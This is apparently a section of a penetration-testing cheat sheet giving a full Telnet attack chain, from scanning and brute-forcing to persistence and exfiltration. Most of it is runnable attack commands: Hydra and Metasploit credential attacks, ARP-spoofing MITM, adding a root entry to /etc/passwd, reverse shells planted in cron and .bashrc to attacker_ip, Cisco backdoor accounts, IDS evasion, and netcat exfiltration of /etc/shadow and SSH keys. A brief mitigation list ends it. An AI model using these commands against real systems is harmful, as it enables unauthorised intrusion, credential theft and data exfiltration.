# 1. TELNET - COMPLETE ATTACK CHAIN <a name="telnet"></a>
 
## 1.1 THEORY & BACKGROUND
 
### What is Telnet?
- **Protocol**: TCP/IP application layer protocol
- **Default Port**: 23/TCP
- **RFC**: RFC 854
- **Purpose**: Remote terminal access to devices
- **Security**: NO ENCRYPTION - all traffic sent in cleartext
- **Authentication**: Username/password sent in plaintext
 
### Why is Telnet Dangerous?
1. **No encryption** - credentials sent in cleartext
2. **No integrity checking** - susceptible to MITM attacks
3. **Session hijacking** - easy to intercept and take over sessions
4. **Legacy protocol** - still found on network devices, IoT, embedded systems
5. **Weak/default credentials** common
 
### Where You'll Find Telnet
- Network devices (routers, switches, firewalls)
- IoT devices (cameras, printers, industrial systems)
- Legacy Unix/Linux systems
- Embedded systems
- BBS systems
- Network management interfaces
 
---
 
## 1.2 ENUMERATION PHASE
 
### 1.2.1 Network Scanning for Telnet
 
**Basic Nmap Scan:**
```bash
# Quick scan for Telnet on common port
nmap -p 23 -sV -sC 192.168.1.0/24
 
# Detailed scan with all Telnet scripts
nmap -p 23 -sV -sC --script telnet-* 192.168.1.100
 
# Scan for Telnet on non-standard ports
nmap -p 1-65535 -sV 192.168.1.100 | grep telnet
 
# Fast scan across large network
nmap -p 23 -T4 --open 192.168.0.0/16 -oG telnet_hosts.txt
```
 
**Masscan for Large Networks:**
```bash
# Ultra-fast scan for Telnet across entire Class B
masscan -p23 192.168.0.0/16 --rate=10000 -oL telnet_masscan.txt
 
# Parse masscan results
grep "open" telnet_masscan.txt | awk '{print $4}' > telnet_ips.txt
```
 
**Metasploit Auxiliary Scanner:**
```bash
msfconsole
use auxiliary/scanner/telnet/telnet_version
set RHOSTS 192.168.1.0/24
set THREADS 50
run
```
 
### 1.2.2 Banner Grabbing & Service Identification
 
**Manual Banner Grab:**
```bash
# Using netcat
nc -vn 192.168.1.100 23
 
# Using telnet client
telnet 192.168.1.100 23
 
# Using ncat with timeout
ncat -v 192.168.1.100 23 -w 5
 
# Script for bulk banner grabbing
for ip in $(cat telnet_ips.txt); do
    echo "=== $ip ===" >> banners.txt
    timeout 5 nc -vn $ip 23 2>&1 | head -20 >> banners.txt
done
```
 
**Automated with Nmap:**
```bash
# Get detailed banner information
nmap -p 23 --script telnet-ntlm-info,telnet-encryption 192.168.1.100
 
# Check for Cisco devices
nmap -p 23 --script telnet-brute,banner 192.168.1.0/24
```
 
**Identifying Device Type from Banner:**
 
Common banners and what they reveal:
 
```
"Cisco" → Cisco router/switch
"User Access Verification" → Cisco device
"Ubuntu" or "Debian" → Linux system
"Welcome to Microsoft Telnet Service" → Windows system
"DD-WRT" → DD-WRT router
"MikroTik" → MikroTik router
"HP" → HP printer or network device
"DVR" or "NVR" → Security camera system
```
 
### 1.2.3 Credential Discovery
 
**Default Credentials Research:**
 
Common default credentials by device type:
 
```bash
# Create credential list for specific device
cat > cisco_creds.txt << EOF
cisco:cisco
admin:admin
admin:password
root:root
admin:
:
Cisco:Cisco
EOF
 
# Generic telnet defaults
cat > telnet_defaults.txt << EOF
admin:admin
admin:password
admin:1234
root:root
root:toor
administrator:password
guest:guest
user:user
support:support
service:service
EOF
```
 
**Research Databases:**
- https://cirt.net/passwords
- https://www.routerpasswords.com/
- https://default-password.info/
- Vendor documentation
- Google: "device_model default credentials"
 
---
 
## 1.3 EXPLOITATION PHASE
 
### 1.3.1 Password Attacks
 
**Manual Login Attempts:**
```bash
# Interactive telnet login
telnet 192.168.1.100
# Try credentials manually:
# Username: admin
# Password: admin
 
# Scripted single credential test
(sleep 2; echo "admin"; sleep 1; echo "password"; sleep 1; echo "exit") | telnet 192.168.1.100
```
 
**Hydra Brute Force:**
```bash
# Single username, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://192.168.1.100
 
# Username and password lists
hydra -L users.txt -P passwords.txt telnet://192.168.1.100
 
# Specific for Cisco devices
hydra -L cisco_users.txt -P cisco_passwords.txt -t 4 telnet://192.168.1.100
 
# With timing to avoid lockout
hydra -l admin -P passwords.txt -t 1 -w 10 telnet://192.168.1.100
 
# Parallel attack on multiple hosts
hydra -L users.txt -P passwords.txt -M telnet_hosts.txt telnet
 
# Verbose output with progress
hydra -l admin -P passwords.txt telnet://192.168.1.100 -V -f
 
# Continue after finding one valid credential
hydra -L users.txt -P passwords.txt telnet://192.168.1.100 -F
```
 
**Medusa Brute Force:**
```bash
# Basic brute force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M telnet
 
# Multiple hosts
medusa -H hosts.txt -U users.txt -P passwords.txt -M telnet -t 5
 
# With specific timing
medusa -h 192.168.1.100 -u admin -P passwords.txt -M telnet -t 1 -T 4
```
 
**Nmap Scripting:**
```bash
# Telnet brute force with Nmap
nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.100
 
# With custom timing
nmap -p 23 --script telnet-brute --script-args telnet-brute.timeout=10s 192.168.1.100
```
 
**Metasploit Brute Force:**
```bash
msfconsole
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 192.168.1.100
set USER_FILE /root/users.txt
set PASS_FILE /root/passwords.txt
set STOP_ON_SUCCESS true
set THREADS 1
run
 
# Targeting Cisco devices
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 192.168.1.100
set USERNAME cisco
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/cisco_passwords.txt
run
```
 
### 1.3.2 Traffic Interception (MITM)
 
**Passive Sniffing with tcpdump:**
```bash
# Capture all Telnet traffic
tcpdump -i eth0 -nn -A port 23 -w telnet_capture.pcap
 
# Display in real-time
tcpdump -i eth0 -nn -A port 23
 
# Capture only on specific host
tcpdump -i eth0 -nn -A 'host 192.168.1.100 and port 23'
 
# Capture with full packet payload
tcpdump -i eth0 -nn -X port 23
```
 
**Wireshark Capture & Analysis:**
```bash
# Start Wireshark capture
wireshark -i eth0 -k -f "port 23"
 
# From terminal, apply display filter in Wireshark:
# Display Filter: telnet
# Follow TCP Stream: Right-click packet → Follow → TCP Stream
```
 
**Extract Credentials from Capture:**
```bash
# Using tcpflow
tcpflow -r telnet_capture.pcap -C -B
 
# Using Wireshark/tshark
tshark -r telnet_capture.pcap -Y telnet -T fields -e telnet.data
 
# Extract with grep (after converting pcap)
tcpdump -A -r telnet_capture.pcap | grep -i "login\|password\|username"
```
 
**Active MITM with Ettercap:**
```bash
# ARP spoofing to intercept traffic
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
 
# With GUI
ettercap -G
 
# Steps in GUI:
# 1. Sniff → Unified sniffing → Select interface
# 2. Hosts → Scan for hosts
# 3. Hosts → Host list
# 4. Select gateway → Add to Target 1
# 5. Select victim → Add to Target 2
# 6. Mitm → ARP poisoning → Sniff remote connections
# 7. Start → Start sniffing
# View → Connections (to see captured credentials)
```
 
**Bettercap MITM:**
```bash
# Modern MITM framework
bettercap -iface eth0
 
# In bettercap console:
> net.probe on
> net.recon on
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> set net.sniff.filter port 23
> net.sniff on
 
# Credentials will appear in output
```
 
**Session Hijacking:**
```bash
# Using hunt (older tool)
hunt
 
# Using ettercap connection killing
ettercap -T -q -i eth0 -M arp:remote /gateway_ip// /victim_ip//
# Then in another terminal, connect to the hijacked session
```
 
### 1.3.3 Post-Authentication Exploitation
 
**Once You Have Access:**
 
**A. Information Gathering:**
```bash
# After telnet login to Unix/Linux:
whoami
id
uname -a
hostname
ifconfig -a
ip addr
cat /etc/passwd
cat /etc/shadow 2>/dev/null
ls -la /home/
ps aux
netstat -tulpn
cat /etc/issue
cat /etc/*-release
env
history
 
# Network info
route -n
arp -a
cat /etc/resolv.conf
cat /etc/hosts
 
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
 
# Find writable directories
find / -writable -type d 2>/dev/null
 
# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
```
 
**B. Privilege Escalation (if low-priv user):**
```bash
# Check sudo permissions
sudo -l
 
# Kernel exploits
uname -a
# Search for kernel exploit on exploit-db
 
# Writable /etc/passwd
ls -la /etc/passwd
# If writable:
openssl passwd -1 -salt xyz password123
echo 'newroot:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot
 
# Exploitable services
ps aux | grep root
# Check for exploitable services running as root
 
# PATH exploitation
echo $PATH
# If '.' is in PATH or writable PATH directory:
cd /tmp
echo '#!/bin/bash' > ls
echo '/bin/bash -p' >> ls
chmod +x ls
# Wait for root to run 'ls' or trigger it
```
 
**C. Persistence:**
```bash
# Add SSH key (if SSH is running)
mkdir -p ~/.ssh
echo 'your_public_key' >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
 
# Add user
useradd -m -s /bin/bash backdoor
echo 'backdoor:password123' | chpasswd
# Or add to /etc/passwd if writable
 
# Cron job backdoor
echo '* * * * * /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1' | crontab -
 
# Bashrc backdoor
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1 &' >> ~/.bashrc
```
 
**D. Lateral Movement:**
```bash
# Find other hosts
cat /etc/hosts
arp -a
netstat -an | grep ESTABLISHED
 
# SSH to other hosts (if keys are available)
cat ~/.ssh/known_hosts
find / -name "id_rsa" 2>/dev/null
# If found:
chmod 600 /path/to/id_rsa
ssh -i /path/to/id_rsa user@another_host
 
# Check for shared credentials
cat ~/.bash_history | grep -i "ssh\|telnet\|password"
```
 
**For Cisco/Network Devices:**
```bash
# After login:
enable
# Enter enable password if required
 
# Show configuration
show running-config
show startup-config
show version
show ip interface brief
show interfaces
show ip route
show arp
 
# Extract passwords
show running-config | include password
# Note: Passwords may be type 5 (MD5), type 7 (weak), or plaintext
 
# Type 7 password decryption
# Use online tools or:
# https://github.com/theevilbit/ciscot7
python ciscot7.py -d encrypted_password
 
# Save configuration
copy running-config tftp://attacker_ip/config.txt
 
# Create backdoor account
configure terminal
username backdoor privilege 15 secret backdoor123
line vty 0 4
login local
exit
write memory
 
# Enable services for further access
configure terminal
ip http server
ip http authentication local
exit
```
 
---
 
## 1.4 CREDENTIAL REUSE & PIVOTING
 
**After Obtaining Credentials:**
```bash
# Try on other services
ssh user@192.168.1.100
rdesktop 192.168.1.100
# etc.
 
# Try on other hosts
for ip in $(cat host_list.txt); do
    echo "Trying $ip"
    hydra -l username -p password telnet://$ip -t 1
done
 
# Store found credentials
echo "192.168.1.100:telnet:admin:cisco123" >> found_creds.txt
```
 
---
 
## 1.5 TRAFFIC ANALYSIS DEEP DIVE
 
**Understanding Telnet Protocol:**
 
Telnet uses **Network Virtual Terminal (NVT)** protocol.
 
**IAC Commands (Interpret As Command):**
- IAC = 0xFF (255 in decimal)
- Common commands:
  - WILL (251)
  - WON'T (252)
  - DO (253)
  - DON'T (254)
 
**Analyzing Telnet Negotiation:**
```bash
# Capture and decode
tshark -r telnet.pcap -Y telnet -V
 
# Example negotiation:
# Server: IAC DO TERMINAL-TYPE
# Client: IAC WILL TERMINAL-TYPE
# Server: IAC SB TERMINAL-TYPE SEND IAC SE
# Client: IAC SB TERMINAL-TYPE IS VT100 IAC SE
```
 
**Extracting Login Session:**
```bash
# Follow TCP stream in Wireshark
tshark -r telnet.pcap -Y telnet -z follow,tcp,ascii,0
 
# Output shows:
# Username: admin
# Password: P@ssw0rd123
# Commands executed...
```
 
---
 
## 1.6 EXPLOITATION TOOLS SUMMARY
 
**Interactive Tools:**
- `telnet` - Built-in client
- `nc` / `ncat` - Netcat
- `putty` - Windows telnet client
 
**Brute Force:**
- `hydra` - Fast parallel attacks
- `medusa` - Modular brute forcer
- `ncrack` - High-speed cracker
- `patator` - Multi-protocol bruteforcer
- Metasploit `telnet_login` module
 
**Traffic Capture:**
- `tcpdump` - Packet capture
- `wireshark` / `tshark` - Analysis
- `tcpflow` - TCP stream reconstruction
- `ettercap` - MITM suite
- `bettercap` - Modern MITM
- `arpspoof` - ARP poisoning
 
**Scanning:**
- `nmap` - Port scanning & scripting
- `masscan` - Ultra-fast scanner
 
---
 
## 1.7 DEFENSE EVASION
 
**Avoiding Detection:**
```bash
# Slow down attacks to avoid IDS
hydra -l admin -P passwords.txt -t 1 -w 30 telnet://192.168.1.100
 
# Use source port manipulation
nmap -p 23 --source-port 53 192.168.1.100
 
# Fragmentation
nmap -p 23 -f 192.168.1.100
 
# Randomize timing
nmap -p 23 -T2 --randomize-hosts 192.168.1.0/24
```
 
---
 
## 1.8 COMPLETE ATTACK SCENARIO
 
**Scenario: Compromising a Network via Telnet**
 
**Step 1: Reconnaissance**
```bash
# Scan network for Telnet
nmap -p 23 -sV --open 192.168.1.0/24 -oG telnet_scan.txt
 
# Results show:
# 192.168.1.10 - Cisco router
# 192.168.1.50 - Linux server
# 192.168.1.100 - IP camera
```
 
**Step 2: Banner Grabbing**
```bash
nc -vn 192.168.1.10 23
# Output: "User Access Verification" - Cisco device
 
nc -vn 192.168.1.50 23
# Output: "Ubuntu 18.04 LTS" - Linux server
 
nc -vn 192.168.1.100 23
# Output: "DVR login:" - IP camera
```
 
**Step 3: Credential Attacks**
```bash
# Try default Cisco credentials
telnet 192.168.1.10
# Username: cisco
# Password: cisco
# Success!
 
# Try default camera credentials
hydra -l admin -P camera_defaults.txt telnet://192.168.1.100
# Found: admin:12345
 
# Brute force Linux server
hydra -L users.txt -P rockyou.txt -t 4 telnet://192.168.1.50
# Found: john:password123
```
 
**Step 4: Exploitation - Cisco Router**
```bash
telnet 192.168.1.10
# Login with cisco:cisco
enable
# No enable password set!
 
show running-config
# Extract VTY password (Type 7): 094F471A1A0A
# Decrypt: "cisco"
 
# Find network information
show ip route
show arp
show ip interface brief
# Discover: 192.168.2.0/24 network connected to Fa0/1
 
# Create backdoor
configure terminal
username backdoor privilege 15 secret P@ssw0rd!123
exit
write memory
 
# Extract config via TFTP
copy running-config tftp://192.168.1.5/router_config.txt
```
 
**Step 5: Exploitation - Linux Server**
```bash
telnet 192.168.1.50
# Login: john:password123
 
# Basic enumeration
id
# Output: uid=1001(john) gid=1001(john) groups=1001(john)
 
sudo -l
# Output: User john may run the following commands:
#         (ALL) NOPASSWD: /usr/bin/find
 
# Privilege escalation
sudo find . -exec /bin/bash -p \; -quit
# Now root!
 
whoami
# root
 
# Post-exploitation
cat /etc/shadow > /tmp/shadow
cat /home/*/.bash_history > /tmp/history.txt
 
# Find credentials in history
grep -i "password\|ssh\|mysql" /tmp/history.txt
# Found: mysql -u root -p'DBpass123'
 
# Set up persistence
mkdir -p ~/.ssh
echo 'ssh-rsa AAAAB3... attacker@kali' >> ~/.ssh/authorized_keys
 
# Add backdoor user
useradd -m -s /bin/bash -G sudo backdoor
echo 'backdoor:Backdoor123!' | chpasswd
```
 
**Step 6: Lateral Movement**
```bash
# From compromised Linux server, scan internal network
for i in {1..254}; do
    ping -c 1 -W 1 192.168.2.$i &>/dev/null && echo "192.168.2.$i is up"
done
 
# Found: 192.168.2.50, 192.168.2.51
 
# Try captured credentials on other hosts
ssh john@192.168.2.50
# Password reuse! Success.
 
# On new host
cat /etc/passwd
# Found user: alice
 
# Try common passwords
hydra -l alice -P common_passwords.txt ssh://192.168.2.50
# Success: alice:Summer2023!
```
 
**Step 7: Data Exfiltration**
```bash
# Set up listener on attacker machine
nc -lvnp 4444 > exfiltrated_data.tar.gz
 
# From compromised host
tar czf - /etc/passwd /etc/shadow /home/*/.ssh | nc attacker_ip 4444
 
# Or use TFTP if available
tar czf /tmp/data.tar.gz /important/data
tftp attacker_ip
put /tmp/data.tar.gz
quit
```
 
---
 
## 1.9 SECURITY IMPLICATIONS SUMMARY
 
### Why Telnet is Dangerous:
 
1. **Cleartext Transmission**: Everything (credentials, commands, output) is unencrypted
2. **No Authentication Security**: Passwords transmitted in plaintext
3. **No Session Integrity**: Easy to hijack or manipulate sessions
4. **Legacy Protocol**: Often has weak/default credentials
5. **No Forward Secrecy**: Captured traffic can be decrypted anytime
6. **Information Disclosure**: Banners reveal OS, device type, versions
 
### Attack Vectors:
- Password attacks (brute force, default credentials)
- Network sniffing/eavesdropping
- MITM attacks
- Session hijacking
- Credential reuse
- Information gathering for further attacks
 
### Mitigation:
- **Replace with SSH** (primary recommendation)
- Disable Telnet entirely
- Use strong, unique passwords
- Implement network segmentation
- Use VPNs for management access
- Enable logging and monitoring
- Implement account lockout policies
- Use certificate-based authentication where possible
 
---